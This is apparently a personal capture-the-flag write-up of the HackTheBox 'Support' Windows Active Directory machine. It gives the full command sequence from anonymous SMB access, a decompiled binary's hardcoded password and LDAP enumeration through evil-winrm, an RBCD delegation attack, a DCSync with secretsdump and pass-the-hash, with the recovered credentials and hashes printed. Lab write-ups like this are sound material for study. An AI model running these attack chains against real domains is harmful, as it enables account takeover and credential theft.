# Support — HackTheBox

**Category:** Active Directory / Windows  
**Difficulty:** Easy  

---

## nmap

```
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-26 12:52:13Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
```

---

## enumeration

I tried SMB anonymous access and it worked and using nxc I saw we had read access in `IPC$` and `support-tools` shares:

```bash
nxc smb support.htb -u 'anonymous' -p '' --shares
```

in the share `support-tools` I saw a file named `UserInfo.exe.zip` which seemed interesting cuz of its name so after downloading it I unzipped it

I searched for possible creds in the files but couldnt find any

Then I used `ilspycmd` to decompile the `UserInfo.exe` file

in `UserInfo.Services/protected.cs` I found an encoded password for `support\ldap` service account:

```
0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
```

reading the code I saw that this password is XOR encrypted with `"armando"` and then again with `0xDF` and then finally encoded with BASE64

so I decrypted it from CyberChef:

https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)XOR(%7B'option':'UTF8','string':'armando'%7D,'Standard',false)XOR(%7B'option':'Hex','string':'DF'%7D,'Standard',false)&input=ME52MzJQVHdnWWp6ZzkvOGo1VGJtdlBkM2U3V2h0V1d5dVBzeU83Ni9ZK1UxOTNF

and got the password:

```
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

so now we have the creds:

```
support\ldap : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

---

## foothold

to enumerate I ran:

```bash
ldapsearch -x -H ldap://support.htb -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(objectClass=*)"
```

it showed a lot of data and many users so I copied it by piping it into xclip:

```bash
ldapsearch -x -H ldap://support.htb -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(objectClass=*)" | xclip -selection clipboard
```

and gave it to claude to tell if any user has any password exposed (common in CTFs) and there was. in the `info` field of the user `support` there was a string that looked like a password and it was!

so now we have creds:

```
support : Ironside47pleasure40Watchful
```

then I saw the user `support` was also in the group `Remote Management Users` by doing:

```bash
ldapsearch -x -H ldap://support.htb -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "cn=support"
```

so I used evil-winrm to get in:

```bash
evil-winrm -i support.htb -u 'support' -p 'Ironside47pleasure40Watchful'
```

---

## privilege escalation — RBCD attack

then I uploaded and used sharphound on the machine from my shell, downloaded the `.zip` file it generated, then on my machine I started bloodhound and uploaded the `.zip` file to it

I then searched for path from our user `support` to Administrator and it showed:

```
SUPPORT@SUPPORT.HTB -> CanPSRemote -> DC.SUPPORT.HTB -> HasSession -> ADMINISTRATOR@SUPPORT.HTB
```

we had already gotten remote shell on `DC.SUPPORT.HTB` using evil-winrm

I then checked for coercion using:

```bash
nxc smb support.htb -u support -p 'Ironside47pleasure40Watchful' -M coerce_plus
```

it showed vulnerable to DFSCoerce. I tried it and got `DC$` hash and my user's hash but not administrator's hash. I tried cracking the `DC$` hash but didnt work.

I then uploaded mimikatz to the machine and when I tried using it it just kept spamming `#` on the screen, so I searched for the issue and found out it is caused due to evil-winrm and gotta run it with `"exit"` at end:

```bash
.\mimikatz.exe "privilege::debug" "exit"
```

and saw my user doesnt have enough privileges to run it as I am not part of local administrator group (I should had checked this earlier but no problem, now I know)

I then enumerated further and in bloodhound saw that my user is part of the group `SHARED SUPPORT ACCOUNT` and this group had `GenericAll` permission on `DC.SUPPORT.HTB`

GenericAll is often referred to as 'Full Control' just because of how many privileges it provides!

I followed the attack path provided in bloodhound:

```bash
# 1. make a new machine account with a SPN set
addcomputer.py -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host DC.support.htb -domain-netbios SUPPORT 'support.htb/support:Ironside47pleasure40Watchful'

# 2. using our GenericAll we edited the DC security settings to allow our machine account to impersonate as anyone (RBCD attack)
rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC$' -action 'write' 'support.htb/support:Ironside47pleasure40Watchful'

# 3. use the machine account to impersonate as Administrator to get a TGT
getST.py -spn 'cifs/DC.support.htb' -impersonate 'Administrator' 'support.htb/attackersystem$:Summer2018!'

# 4. save the TGT in klist so impacket tools can use it
export KRB5CCNAME=$(pwd)/Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache

# 5. DCSync to dump the creds
secretsdump.py -k -no-pass DC.support.htb
```

we got Administrator creds:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::
```

using the NT hash we got shell as Administrator:

```bash
evil-winrm -i support.htb -u Administrator -H bb06cbc02b39abeddd1335bc30b19e26
```

and now we are Administrator!!

---

## proof

![root](../proofs/support.png)
